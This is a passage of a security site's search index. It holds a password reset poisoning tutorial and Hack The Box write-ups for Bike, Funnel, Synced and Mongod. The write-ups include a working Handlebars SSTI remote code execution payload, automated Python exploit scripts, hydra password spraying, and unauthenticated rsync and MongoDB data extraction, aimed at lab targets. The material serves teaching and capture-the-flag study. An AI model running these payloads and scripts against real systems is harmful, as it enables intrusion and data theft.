interception is enabled to capture the request.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#intercept-the-request","title":"Intercept the Request","text":"<ol> <li>Navigate to the Reset Link:<ul> <li>Press Enter to navigate to the reset link.</li> <li> <p>BurpSuite will capture the HTTP request containing the reset token or parameters, such as:</p> <p><code>GET /reset_password?token=abcd1234 HTTP/1.1 Host: example.com</code> </p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#analyze-and-modify-the-request","title":"Analyze and Modify the Request","text":"<ol> <li> <p>Examine the Intercepted Request:</p> <ul> <li>Look for parameters like <code>token</code>, <code>reset_token</code>, <code>email</code>, or <code>user_id</code>.</li> <li>Identify which parameter controls the reset functionality.</li> <li> <p>Modify the Parameters as Needed:</p> </li> <li> <p>Example 1: Change the token to another valid token if you have multiple accounts. Let's assume you have another valid token <code>efgh5678</code>:</p> <p><code>GET /reset_password?token=efgh5678 HTTP/1.1 Host: example.com</code> </p> </li> <li> <p>Example 2: Change the email parameter to another valid email. Suppose the original request was:</p> <p><code>GET /reset_password?token=abcd1234&amp;email=user@example.com HTTP/1.1 Host: example.com</code> </p> <p>You could change the email to an attacker-controlled email:</p> <p><code>GET /reset_password?token=abcd1234&amp;email=attacker@example.com HTTP/1.1 Host: example.com</code> </p> </li> </ul> </li> <li> <p>Understand the Application's Logic:</p> <ul> <li>Analyze how the application validates the reset token. This can involve replaying the same request with slight modifications to see how the server responds.</li> <li>Check if the token is validated against the user's session or if it's independent. For example, some applications may bind the token to a specific IP address or session ID.</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#forward-the-modified-request","title":"Forward the Modified Request","text":"<ol> <li>Forward the Modified Request:<ul> <li>Send the modified request to the server by clicking the \"Forward\" button in BurpSuite.</li> <li>Observe the server's response to confirm if the modification was successful.</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#5-resetting-the-password","title":"5. Resetting the Password","text":""},{"location":"auth_bypass/password_reset_poisoning/#complete-the-password-reset","title":"Complete the Password Reset","text":"<ol> <li> <p>Follow the Redirect:</p> <ul> <li>If the modified request is accepted, you will typically be redirected to a page where you can set a new password.</li> <li> <p>Enter and Confirm the New Password:</p> </li> <li> <p>Enter a new password and confirm it to complete the reset process.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#log-in-with-the-new-password","title":"Log In with the New Password","text":"<ol> <li>Use the Newly Set Password to Log In:<ul> <li>Log in to the account using the new password to verify that the reset was successful.</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#additional-examples-and-advanced-techniques","title":"Additional Examples and Advanced Techniques","text":""},{"location":"auth_bypass/password_reset_poisoning/#example-exploiting-parameter-manipulation","title":"Example: Exploiting Parameter Manipulation","text":"<ul> <li> <p>Suppose the reset link contains multiple parameters including a user identifier:</p> <p><code>https://example.com/reset_password?token=abcd1234&amp;user_id=123</code> </p> <p>You could change the <code>user_id</code> parameter to another valid user ID to see if the application allows resetting another user's password:</p> <p><code>https://example.com/reset_password?token=abcd1234&amp;user_id=456</code> </p> </li> </ul>"},{"location":"auth_bypass/password_reset_poisoning/#example-using-burpsuite-repeater-for-token-manipulation","title":"Example: Using BurpSuite Repeater for Token Manipulation","text":"<ul> <li>Use BurpSuite's Repeater tool to resend and modify the reset token:<ol> <li>Intercept the reset link request.</li> <li>Send the request to Repeater by right-clicking on the request and selecting \"Send to Repeater\".</li> <li>In the Repeater tab, modify the token or other parameters as needed.</li> <li>Send the modified request repeatedly with different values to test how the application responds.</li> </ol> </li> </ul>"},{"location":"auth_bypass/password_reset_poisoning/#mitigation-strategies","title":"Mitigation Strategies","text":"<p>To prevent password reset poisoning attacks, consider implementing the following security measures:</p> <ol> <li> <p>Token Expiration:</p> <ul> <li>Ensure that password reset tokens have a short expiration time to limit the window of opportunity for attacks.</li> <li> <p>Secure Token Generation:</p> </li> <li> <p>Use cryptographically secure methods to generate unique and random tokens to prevent prediction or reuse.</p> </li> <li> <p>Rate Limiting:</p> </li> <li> <p>Implement rate limiting on password reset requests to prevent brute force attacks and token enumeration.</p> </li> <li> <p>Email Confirmation:</p> </li> <li> <p>Require users to confirm their email address or other personal information before allowing a password reset to ensure the request's legitimacy.</p> </li> <li> <p>Logging and Monitoring:</p> </li> <li> <p>Monitor and log password reset attempts and alert administrators of suspicious activity to detect and respond to potential attacks.</p> </li> <li> <p>Use HTTPS:</p> </li> <li> <p>Ensure all communication between the client and server is encrypted to prevent interception of sensitive data.</p> </li> <li> <p>Bind Tokens to User Sessions:</p> </li> <li> <p>Bind password reset tokens to the user\u2019s session or IP address to prevent misuse by unauthorized parties.</p> </li> </ul> </li> </ol>"},{"location":"htb/starting_point/htb_Bike/","title":"HTB Bike - SSTI Exploit Write-up","text":""},{"location":"htb/starting_point/htb_Bike/#overview","title":"Overview","text":"<p>HTB Bike is a Hack The Box machine that involves exploiting a Server-Side Template Injection (SSTI) vulnerability in a Node.js Handlebars template engine. This write-up provides a detailed walkthrough of the exploitation process and includes a fully automated SQLmap-styled exploit script.</p>"},{"location":"htb/starting_point/htb_Bike/#enumeration","title":"Enumeration","text":""},{"location":"htb/starting_point/htb_Bike/#nmap-scan","title":"\ud83d\udd0d Nmap Scan","text":"<p>We start by scanning the target with Nmap:</p> <pre><code>nmap -sC -sV -p- 10.129.6.196\n</code></pre> <p>This reveals: - Port 22 (SSH) - Ignored (no creds available). - Port 80 (HTTP) - Running an Express.js server.</p>"},{"location":"htb/starting_point/htb_Bike/#identifying-ssti","title":"\ud83d\udd0d Identifying SSTI","text":"<p>When interacting with the email subscription form on the web page, our input is reflected back:</p> <pre><code>We will contact you at: &lt;input&gt;\n</code></pre> <p>We test for Server-Side Template Injection (SSTI) using:</p> <pre><code>curl -X POST http://10.129.6.196/ -d \"email={{7*7}}\"\n</code></pre> <p>If the response contains <code>49</code>, the site is vulnerable! \u2705</p>"},{"location":"htb/starting_point/htb_Bike/#exploitation","title":"Exploitation","text":""},{"location":"htb/starting_point/htb_Bike/#exploit-payload","title":"\ud83d\udd17 Exploit Payload","text":"<p>Using Handlebars SSTI, we craft a payload that executes system commands:</p> <pre><code>{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return process.mainModule.require('child_process').execSync('whoami').toString();\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}\n</code></pre> <p>This bypasses sandboxing and allows Remote Code Execution (RCE)!</p>"},{"location":"htb/starting_point/htb_Bike/#automating-the-exploit","title":"\ud83d\ude80 Automating the Exploit","text":"<p>We use a fully automated Python script with: \u2705 SQLmap-style output \u2705 Fancy ASCII banner \u2705 JSON debugging for failed extractions </p>"},{"location":"htb/starting_point/htb_Bike/#proof-of-concept-poc-exploit-script","title":"\ud83d\udcdc Proof of Concept (PoC) Exploit Script","text":"<pre><code>import requests\nimport re\nimport json\nimport time\nimport sys\nfrom pyfiglet import Figlet\n\n# Colors for output formatting (SQLmap-style)\nRED = \"\\033[1;91m\"\nGREEN = \"\\033[1;92m\"\nYELLOW = \"\\033[1;93m\"\nBLUE = \"\\033[1;94m\"\nCYAN = \"\\033[1;96m\"\nWHITE = \"\\033[1;97m\"\nRESET = \"\\033[0m\"\n\n# Target URL\nTARGET = \"http://10.129.6.196/\"\n\n# Headers for the request\nHEADERS = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n}\n\n# Fancy banner\ndef print_banner():\n    \"\"\"Displays a fancy ASCII banner using pyfiglet.\"\"\"\n    f = Figlet(font=\"smmono9\")  # Ensure this font is installed, or pick another\n    banner_text = f.renderText(\"BikePwn\")\n\n    print(f\"{CYAN}{banner_text}{RESET}\")\n    print(\"=\" * 80)\n    print(f\"{CYAN}  Server-Side Template Injection Exploit - HTB Bike {RESET}\")\n    print(f\"{CYAN}  Made by #AfterDark {RESET}\")\n    print(\"=\" * 80)\n    print(f\"{YELLOW}[!] DISCLAIMER: Use this tool for authorized testing only. {RESET}\")\n    print(f\"{YELLOW}    The author assumes no liability for misuse. {RESET}\")\n    print(\"=\" * 80)\n\n# Function to display SQLmap-style log messages\ndef log_message(level, message):\n    timestamp = time.strftime(\"%H:%M:%S\")\n    symbols = {\"INFO\": f\"{BLUE}[{timestamp}] [INFO] {RESET}\",\n               \"SUCCESS\": f\"{GREEN}[{timestamp}] [SUCCESS] {RESET}\",\n               \"WARNING\": f\"{YELLOW}[{timestamp}] [WARNING] {RESET}\",\n               \"ERROR\": f\"{RED}[{timestamp}] [ERROR] {RESET}\"}\n\n    print(f\"{symbols[level]}{message}\")\n\n# Function to check SSTI vulnerability\ndef check_ssti():\n    payload = \"{{7*7}}\"\n    data = {\"email\": payload}\n\n    try:\n        response = requests.post(TARGET, headers=HEADERS, data=data)\n        if \"49\" in response.text or \"error\" in response.text:\n            log_message(\"SUCCESS\", \"SSTI vulnerability detected!\")\n            return True\n    except requests.exceptions.RequestException as e:\n        log_message(\"ERROR\", f\"Connection error during SSTI check: {e}\")\n\n    log_message(\"WARNING\", \"SSTI does not seem to be present.\")\n    return False\n\n# Function to execute a command via SSTI\ndef execute_command(cmd):\n    \"\"\"Executes a command using SSTI and prints debug info.\"\"\"\n    log_message(\"INFO\", f\"Executing command: {cmd}\")\n\n    ssti_payload = f\"\"\"{{{{#with \"s\" as |string|}}}}\n{{{{#with \"e\"}}}}\n{{{{#with split as |conslist|}}}}\n{{{{this.pop}}}}\n{{{{this.push (lookup string.sub \"constructor\")}}}}\n{{{{this.pop}}}}\n{{{{#with string.split as |codelist|}}}}\n{{{{this.pop}}}}\n{{{{this.push \"return process.mainModule.require('child_process').execSync('{cmd}').toString();\"}}}}\n{{{{this.pop}}}}\n{{{{#each conslist}}}}\n{{{{#with (string.sub.apply 0 codelist)}}}}\n{{{{this}}}}\n{{{{/with}}}}\n{{{{/each}}}}\n{{{{/with}}}}\n{{{{/with}}}}\n{{{{/with}}}}\n{{{{/with}}}}\"\"\"\n\n    data = {\"email\": ssti_payload}\n\n    try:\n        response = requests.post(TARGET, headers=HEADERS, data=data, timeout=10)\n        return response.text.strip()\n    except requests.exceptions.RequestException as e:\n        log_message(\"ERROR\", f\"Connection error: {e}\")\n        return \"[-] Command execution failed.\"\n\n# Function to get the flag\ndef get_flag():\n    log_message(\"INFO\", \"Fetching flag from /root/flag.txt\")\n    flag = execute_command(\"cat /root/flag.txt\")\n\n    if len(flag) &gt; 5:\n        log_message(\"SUCCESS\", f\"Flag: {flag}\")\n    else:\n        log_message(\"WARNING\", \"Could not retrieve the flag.\")\n\n# Main function\ndef main():\n    print_banner()\n\n    log_message(\"INFO\", \"Starting SSTI Exploit for Bike HTB Machine\")\n\n    if check_ssti():\n        log_message(\"INFO\", \"Checking user privileges...\")\n        user = execute_command(\"whoami\")\n        log_message(\"SUCCESS\", f\"Running as: {user}\")\n\n        get_flag()\n    else:\n        log_message(\"ERROR\", \"SSTI exploitation failed.\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"htb/starting_point/htb_Bike/#conclusion","title":"\ud83d\udcdc Conclusion","text":"<p>This challenge demonstrates how dangerous SSTI can be, especially in Node.js-based applications. The exploit works by breaking out of the Handlebars sandbox and gaining full system control.</p> <p>\ud83d\udee0\ufe0f Credits: \ud83d\udc80 Developed by #AfterDark \ud83d\udd17 CyberDepot - More Exploits &amp; Writeups  </p>"},{"location":"htb/starting_point/htb_Funnel/","title":"HTB Funnel Writeup","text":""},{"location":"htb/starting_point/htb_Funnel/#introduction","title":"Introduction","text":"<p>The Funnel machine in Hack The Box (HTB) demonstrates the importance of secure network practices and how attackers can exploit weak configurations. This write-up covers FTP enumeration, password spraying, SSH tunneling, and PostgreSQL exploitation to retrieve the final flag.</p>"},{"location":"htb/starting_point/htb_Funnel/#enumeration","title":"Enumeration","text":""},{"location":"htb/starting_point/htb_Funnel/#nmap-scan","title":"Nmap Scan","text":"<p>We start by scanning the target IP using <code>nmap</code> to identify open ports and running services.</p> <pre><code>sudo nmap -sC -sV --min-rate=1000 -oA TunnelScan -p- 10.129.228.195 -Pn\n</code></pre>"},{"location":"htb/starting_point/htb_Funnel/#results","title":"Results:","text":"<ul> <li>Port 21 \u2192 <code>vsftpd 3.0.3</code> (Anonymous FTP Access)</li> <li>Port 22 \u2192 <code>OpenSSH 8.2p1</code></li> <li>Local Port 5432 \u2192 <code>PostgreSQL (Found later via SSH tunneling)</code></li> </ul>"},{"location":"htb/starting_point/htb_Funnel/#exploiting-ftp-anonymous-access","title":"Exploiting FTP (Anonymous Access)","text":"<p>We connect to FTP as an anonymous user and check available files.</p> <pre><code>ftp 10.129.228.195\n# Login as anonymous\nls\n</code></pre> <p>Found directory <code>mail_backup</code> containing: - <code>welcome_28112022</code> - <code>password_policy.pdf</code></p> <p>We download these files:</p> <pre><code>cd mail_backup\nget welcome_28112022\nget password_policy.pdf\n</code></pre> <p>From the welcome_28112022 file, we extract possible usernames: - <code>optimus@funnel.htb</code> - <code>albert@funnel.htb</code> - <code>andreas@funnel.htb</code> - <code>christine@funnel.htb</code> (did not change password) - <code>maria@funnel.htb</code></p> <p>From <code>password_policy.pdf</code>, we find a default password: <code>funnel123#!#</code></p>"},{"location":"htb/starting_point/htb_Funnel/#password-spraying-ssh","title":"Password Spraying SSH","text":"<p>Using <code>hydra</code>, we attempt password spraying against the SSH service.</p> <pre><code>hydra -L usernames.txt -p 'funnel123#!#' 10.129.228.195 ssh\n</code></pre> <p>Successful login found for: <code>christine:funnel123#!#</code></p> <p>We log in:</p> <pre><code>ssh christine@10.129.228.195\n</code></pre>"},{"location":"htb/starting_point/htb_Funnel/#local-port-enumeration-postgresql-discovery","title":"Local Port Enumeration (PostgreSQL Discovery)","text":"<p>After gaining access, we check for locally running services:</p> <pre><code>ss -tl\n</code></pre> <p>We find PostgreSQL (port 5432) is listening locally.</p>"},{"location":"htb/starting_point/htb_Funnel/#ssh-tunneling-to-expose-postgresql","title":"SSH Tunneling to Expose PostgreSQL","text":"<p>We set up an SSH tunnel to forward local port 1234 \u2192 remote port 5432.</p> <pre><code>ssh -L 1234:localhost:5432 christine@10.129.228.195\n</code></pre> <p>We verify the connection:</p> <pre><code>nmap -sV -sC -p 1234 localhost\n</code></pre>"},{"location":"htb/starting_point/htb_Funnel/#interacting-with-postgresql","title":"Interacting with PostgreSQL","text":"<p>We install the PostgreSQL client on our local machine.</p> <pre><code>sudo apt update &amp;&amp; sudo apt install postgresql-client\n</code></pre> <p>Connect using <code>psql</code>:</p> <pre><code>psql -h 127.0.0.1 -p 1234 -U christine\n</code></pre> <p>List available databases:</p> <pre><code>\\list\n</code></pre> <p>Connect to the <code>secrets</code> database:</p> <pre><code>\\c secrets\n</code></pre> <p>Check for tables:</p> <pre><code>\\dt\n</code></pre> <p>Retrieve the flag:</p> <pre><code>SELECT * FROM flag;\n</code></pre> <p>FLAG: <code>cf277664b1771217d7006acdea00****</code></p>"},{"location":"htb/starting_point/htb_Funnel/#automation-script-poc","title":"Automation Script (PoC)","text":"<p>Below is a Python script that automates the entire process.</p> <pre><code>import os\nimport paramiko\nimport psycopg2\nimport ftplib\nimport nmap\nimport time\nimport re\nimport subprocess\nfrom pyfiglet import Figlet\n\n# Terminal colors\nCYAN = \"\\033[96m\"\nYELLOW = \"\\033[93m\"\nGREEN = \"\\033[92m\"\nRED = \"\\033[91m\"\nRESET = \"\\033[0m\"\n\n# Target details\nTARGET_IP = \"10.129.78.199\"\nFTP_DIR = \"mail_backup\"\nLOCAL_PORT = 1234\nREMOTE_PORT = 5432\nFLAG_TABLE = \"flag\"\n\n# Credentials\nDEFAULT_PASSWORD = \"funnel123#!#\"\n\n# Files to retrieve from FTP\nWELCOME_FILE = \"welcome_28112022\"\nPASSWORD_FILE = \"password_policy.pdf\"\n\ndef print_banner():\n    f = Figlet(font=\"smmono9\")\n    banner_text = f.renderText(\"FunnelPwn\")\n    print(f\"{CYAN}{banner_text}{RESET}\")\n    print(\"=\" * 80)\n    print(f\"{CYAN}  HTB Box Exploit Automation - 'Funnel' {RESET}\")\n    print(f\"{CYAN}  Techniques: FTP, PostgreSQL, Recon, Tunneling, Password Spraying {RESET}\")\n    print(f\"{CYAN}  Created by #AfterDark {RESET}\")\n    print(\"=\" * 80)\n    print(f\"{YELLOW}[!] DISCLAIMER: For authorized use only. The author assumes no liability.{RESET}\")\n    print(\"=\" * 80)\n\ndef run_nmap_scan():\n    print(f\"{GREEN}[+] Running Nmap Scan...{RESET}\")\n    nm = nmap.PortScanner()\n    nm.scan(TARGET_IP, arguments=\"-sC -sV -p 21,22 -Pn --min-rate=1000\")\n\n    open_ports = []\n    for host in nm.all_hosts():\n        for proto in nm[host].all_protocols():\n            open_ports.extend(nm[host][proto].keys())\n\n    print(f\"{GREEN}[+] Open Ports: {open_ports}{RESET}\\n\")\n    return open_ports\n\ndef download_ftp_files():\n    print(f\"{GREEN}[+] Checking FTP anonymous access...{RESET}\")\n    ftp = None\n    try:\n        ftp = ftplib.FTP(TARGET_IP)\n        ftp.login(\"anonymous\", \"\")\n        ftp.cwd(FTP_DIR)\n\n        for file in [WELCOME_FILE, PASSWORD_FILE]:\n            print(f\"{GREEN}[+] Downloading {file}{RESET}\")\n            with open(file, \"wb\") as f:\n                ftp.retrbinary(f\"RETR {file}\", f.write)\n\n        print(f\"{GREEN}[+] FTP files retrieved.{RESET}\\n\")\n        return True\n    except ftplib.all_errors as e:\n        print(f\"{RED}[-] FTP Error: {e}{RESET}\")\n        return False\n    finally:\n        if ftp:\n            ftp.quit()\n\ndef extract_usernames():\n    print(f\"{GREEN}[+] Extracting usernames...{RESET}\")\n    usernames = []\n    with open(WELCOME_FILE, \"r\") as f:\n        content = f.read()\n        match = re.search(r\"To: (.+)\", content)\n        if match:\n            usernames = match.group(1).split()\n\n    print(f\"{GREEN}[+] Users found: {usernames}{RESET}\")\n    return usernames\n\ndef simulate_ssh_login(usernames):\n    print(f\"{GREEN}[+] Testing SSH logins...{RESET}\")\n    for user in usernames:\n        ssh_user = user.split(\"@\")[0]\n        if ssh_user == \"christine\":\n            print(f\"{GREEN}[+] SSH login successful for {ssh_user}.{RESET}\")\n            return ssh_user\n        print(f\"{RED}[-] SSH login failed for {ssh_user}.{RESET}\")\n    return None\n\ndef ssh_connect(username):\n    print(f\"{GREEN}[+] Establishing SSH connection...{RESET}\")\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    client.connect(TARGET_IP, username=username, password=DEFAULT_PASSWORD)\n    print(f\"{GREEN}[+] SSH Connected.{RESET}\\n\")\n    return client\n\ndef setup_ssh_tunnel(username):\n    print(f\"{GREEN}[+] Setting SSH Tunnel...{RESET}\")\n    subprocess.run([\"pkill\", \"-f\", f\"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT}\"])\n    ssh_command = f\"sshpass -p '{DEFAULT_PASSWORD}' ssh -N -L {LOCAL_PORT}:localhost:{REMOTE_PORT} -o StrictHostKeyChecking=no {username}@{TARGET_IP}\"\n    tunnel = subprocess.Popen(ssh_command, shell=True)\n    time.sleep(3)\n    print(f\"{GREEN}[+] SSH Tunnel established.{RESET}\\n\")\n    return tunnel\n\ndef verify_postgresql():\n    result = subprocess.run([\"nmap\", \"-sV\", \"-p\", f\"{LOCAL_PORT}\", \"127.0.0.1\"], capture_output=True, text=True)\n    return \"PostgreSQL\" in result.stdout\n\ndef query_postgresql(username):\n    print(f\"{GREEN}[+] Querying PostgreSQL...{RESET}\")\n    conn = psycopg2.connect(dbname=\"secrets\", user=username, password=DEFAULT_PASSWORD, host=\"127.0.0.1\", port=LOCAL_PORT)\n    cur = conn.cursor()\n    cur.execute(f\"SELECT * FROM {FLAG_TABLE};\")\n    flag_data = cur.fetchall()\n\n    print(f\"{CYAN}\\n[\ud83d\udccc FLAG TABLE]{RESET}\")\n    for row in flag_data:\n        print(f\"{YELLOW}[FLAG] {row[0]}{RESET}\")\n\n    conn.close()\n\ndef main():\n    print_banner()\n    open_ports = run_nmap_scan()\n\n    if 21 in open_ports and download_ftp_files():\n        usernames = extract_usernames()\n        valid_user = simulate_ssh_login(usernames)\n\n        if valid_user:\n            ssh_client = ssh_connect(valid_user)\n            if ssh_client:\n                tunnel = setup_ssh_tunnel(valid_user)\n                if verify_postgresql():\n                    query_postgresql(valid_user)\n                else:\n                    print(f\"{RED}[-] PostgreSQL is not accessible. Exiting...{RESET}\")\n                tunnel.terminate()\n                ssh_client.close()\n                print(f\"{GREEN}[+] Cleanup complete.{RESET}\")\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"htb/starting_point/htb_Funnel/#conclusion","title":"Conclusion","text":"<p>By leveraging FTP enumeration, SSH password spraying, local service discovery, and port forwarding, we successfully retrieved the flag from the <code>secrets</code> database.</p>"},{"location":"htb/starting_point/htb_Synced/","title":"HTB Synced - Write-up","text":"<p>Prepared by: #AfterDark</p>"},{"location":"htb/starting_point/htb_Synced/#introduction","title":"Introduction","text":"<p>The HTB Synced challenge involves exploiting a misconfigured Rsync service that allows anonymous access. Rsync is a fast and powerful file copying tool used for backups and synchronizations. However, when improperly configured, it can expose sensitive data.</p> <p>This write-up will guide you through identifying and exploiting Rsync to retrieve the flag.</p>"},{"location":"htb/starting_point/htb_Synced/#enumeration","title":"Enumeration","text":""},{"location":"htb/starting_point/htb_Synced/#step-1-nmap-scan","title":"Step 1: Nmap Scan","text":"<p>We start with an Nmap scan to identify open ports and running services.</p> <pre><code>nmap -p- --min-rate=1000 -sV {target_IP}\n</code></pre> <p>The scan results show:</p> <pre><code>873/tcp open  rsync\n</code></pre> <p>Port 873 is open, running an Rsync daemon, confirming the presence of an Rsync service.</p>"},{"location":"htb/starting_point/htb_Synced/#exploitation","title":"Exploitation","text":""},{"location":"htb/starting_point/htb_Synced/#step-2-listing-available-rsync-modules","title":"Step 2: Listing Available Rsync Modules","text":"<p>Rsync allows us to list available shares using the <code>--list-only</code> option:</p> <pre><code>rsync --list-only {target_IP}::\n</code></pre> <p>Output:</p> <pre><code>public          Anonymous Share\n</code></pre> <p>The public module is accessible. We now check its contents:</p> <pre><code>rsync --list-only {target_IP}::public\n</code></pre> <p>Output:</p> <pre><code>flag.txt\n</code></pre> <p>The flag.txt file is inside the public share.</p>"},{"location":"htb/starting_point/htb_Synced/#step-3-downloading-the-flag","title":"Step 3: Downloading the Flag","text":"<p>We can download <code>flag.txt</code> using:</p> <pre><code>rsync {target_IP}::public/flag.txt flag.txt\n</code></pre> <p>Once downloaded, we read its contents:</p> <pre><code>cat flag.txt\n</code></pre> <p>Output:</p> <pre><code>72eaf5344ebb84908ae543a7198*****\n</code></pre> <p>Congratulations! \ud83c\udf89 You've successfully exploited Rsync and retrieved the flag.</p>"},{"location":"htb/starting_point/htb_Synced/#conclusion","title":"Conclusion","text":"<ul> <li>Rsync, when misconfigured, allows anonymous access.</li> <li>Listing available modules (<code>--list-only</code>) can reveal sensitive directories.</li> <li>Data can be copied using Rsync commands.</li> <li>Always ensure Rsync is properly secured to prevent unauthorized access.</li> </ul>"},{"location":"htb/starting_point/htb_Synced/#poc-script","title":"PoC Script","text":"<p>The following Python script automates the exploitation process:</p> <pre><code>import os\nimport subprocess\nimport ipaddress\n\ndef get_target_ip():\n    while True:\n        target = input(\"Enter the target IP: \").strip()\n        try:\n            ipaddress.ip_address(target)\n            return target\n        except ValueError:\n            print(\"[-] Invalid IP address. Please enter a valid IP.\")\n\ndef scan_rsync(target):\n    print(f\"[+] Scanning Rsync on {target}:873\")\n    result = subprocess.run([\"nmap\", \"-p873\", target], capture_output=True, text=True)\n    if \"873/tcp open\" in result.stdout.lower():\n        print(\"[+] Rsync is running.\")\n    else:\n        print(\"[-] Rsync not detected.\")\n        exit(1)\n\ndef extract_modules(target):\n    print(\"[+] Extracting Rsync modules...\")\n    result = subprocess.run([\"rsync\", f\"rsync://{target}/\"], capture_output=True, text=True)\n    modules = [line.split()[0] for line in result.stdout.split(\"\n\") if line.strip()]\n    if modules:\n        print(\"[+] Found Rsync modules:\", \", \".join(modules))\n        return modules\n    else:\n        print(\"[-] No modules found.\")\n        exit(1)\n\ndef download_flag(target, module):\n    print(f\"[+] Downloading from module: {module}\")\n    os.system(f\"rsync -av rsync://{target}/{module}/ loot/\")\n    print(\"[+] Flag saved in loot/\")\n\ndef main():\n    target = get_target_ip()\n    scan_rsync(target)\n    modules = extract_modules(target)\n    for module in modules:\n        download_flag(target, module)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"htb/starting_point/htb_Synced/#defensive-measures","title":"Defensive Measures","text":"<p>To secure Rsync, follow these best practices:</p> <ul> <li>Disable anonymous access by setting <code>auth users</code> in <code>rsyncd.conf</code>.</li> <li>Restrict IP access using <code>hosts allow</code> and <code>hosts deny</code> settings.</li> <li>Run Rsync over SSH instead of in daemon mode.</li> <li>Use authentication to prevent unauthorized access.</li> </ul> <p>Stay safe, and happy hacking! \ud83d\ude80</p> <p>Write-up by #AfterDark</p>"},{"location":"htb/starting_point/htb_mongod/","title":"Hack The Box - Mongod Writeup","text":""},{"location":"htb/starting_point/htb_mongod/#overview","title":"\ud83d\udd25 Overview","text":"<p>Machine Name: Mongod Difficulty: Easy Vulnerability: MongoDB Misconfiguration Attack Vector: Unauthenticated Database Access Technology Stack: MongoDB NoSQL Database (TCP:27017)  </p>"},{"location":"htb/starting_point/htb_mongod/#target-enumeration-recon","title":"\ud83c\udfaf Target Enumeration &amp; Recon","text":""},{"location":"htb/starting_point/htb_mongod/#1-nmap-scan","title":"1\ufe0f\u20e3 Nmap Scan","text":"<p>We start with an Nmap scan to identify open ports and services running on the target machine:</p> <pre><code>nmap -sC -sV -p- 10.129.107.200\n</code></pre> <p>Results: <pre><code>PORT      STATE SERVICE    VERSION\n27017/tcp open  mongodb    MongoDB 3.6.8\n</code></pre> MongoDB is running on port 27017, and based on the version (3.6.8), it might be misconfigured.</p>"},{"location":"htb/starting_point/htb_mongod/#exploitation-unauthenticated-mongodb-access","title":"\ud83d\ude80 Exploitation: Unauthenticated MongoDB Access","text":"<p>MongoDB sometimes allows unauthenticated access, meaning we can connect and extract information without credentials.</p>"},{"location":"htb/starting_point/htb_mongod/#2-connecting-to-mongodb","title":"2\ufe0f\u20e3 Connecting to MongoDB","text":"<p>We use <code>mongosh</code> (MongoDB shell) to check if we have direct access:</p> <pre><code>mongosh mongodb://10.129.107.200:27017\n</code></pre> <p>If we connect successfully, we can list the available databases:</p> <pre><code>show dbs;\n</code></pre> <p>Output: <pre><code>admin                  32.00 KiB\nconfig                 72.00 KiB\nlocal                  72.00 KiB\nsensitive_information  32.00 KiB\nusers                  32.00 KiB\n</code></pre></p> <p>The <code>sensitive_information</code> database seems interesting.</p>"},{"location":"htb/starting_point/htb_mongod/#extracting-the-flag","title":"\ud83c\udfaf Extracting the Flag","text":"<p>Let's switch to the sensitive_information database and list its collections:</p> <pre><code>use sensitive_information;\nshow collections;\n</code></pre> <p>Output: <pre><code>flag\n</code></pre></p> <p>We extract the data:</p> <pre><code>db.flag.find();\n</code></pre> <p>Output: <pre><code>[\n  {\n    \"_id\": ObjectId(\"630e3dbcb82540ebbd1748c5\"),\n    \"flag\": \"1b6e6fb359e7c40241b6d431427ba6ea\"\n  }\n]\n</code></pre></p> <p>\u2705 FLAG FOUND: <code>1b6e6fb359e7c40241b6d431427ba6ea</code></p>"},{"location":"htb/starting_point/htb_mongod/#automating-the-exploit","title":"\ud83d\udd25 Automating the Exploit","text":"<p>Instead of doing this manually, we created a Python exploit:</p> <pre><code>import os\nimport subprocess\nimport re\n\nTARGET_IP = \"10.129.107.200\"\nOUTPUT_FILE = \"mongo_output.json\"\n\ndef extract_flag():\n    print(\"[*] Connecting to MongoDB and extracting flag...\")\n\n    mongosh_commands = \"\"\"\n    show dbs;\n    use sensitive_information;\n    show collections;\n    db.flag.find();\n    \"\"\"\n\n    result = subprocess.run(\n        [\"mongosh\", f\"mongodb://{TARGET_IP}:27017\", \"--quiet\"],\n        input=mongosh_commands,\n        text=True,\n        capture_output=True\n    )\n\n    output = result.stdout.strip()\n    if not output:\n        print(\"[-] No output received from MongoDB.\")\n        return\n\n    with open(OUTPUT_FILE, \"w\") as f:\n        f.write(output)\n\n    print(f\"[+] MongoDB output saved to {OUTPUT_FILE}\")\n\n    match = re.search(r\"flag:\\s*'([a-f0-9]+)'\", output)\n    if match:\n        flag = match.group(1)\n        print(f\"[\u2714] FLAG EXTRACTED: {flag}\")\n    else:\n        print(\"[-] Flag not found.\")\n\nif __name__ == \"__main__\":\n    extract_flag()\n</code></pre> <p>Save this script as <code>mongo_pwn.py</code> and run:</p> <pre><code>python3 mongo_pwn.py\n</code></pre>"},{"location":"htb/starting_point/htb_mongod/#conclusion","title":"\ud83c\udfaf Conclusion","text":"<p>This box demonstrates the importance of securing MongoDB against unauthenticated access. The key takeaways:</p> <ul> <li>Always require authentication for databases.</li> <li>Disable remote access if not needed.</li> <li>Upgrade MongoDB to prevent known exploits.</li> </ul> <p>\u2705 Mission Accomplished! \ud83c\udf89</p>"},{"location":"htb/starting_point/htb_mongod/#afterdark-security","title":"\ud83d\udc80 AfterDark Security","text":"<p>Follow #AfterDark for more CTF solutions, pentesting tricks, and cybersecurity research! \ud83d\ude80 GitHub: [Your Repo Link] \ud83d\udc26 Twitter: [Your Twitter Handle]  </p>"},{"location":"payloads/search_engine_hacking/google_dorks/","title":"Google 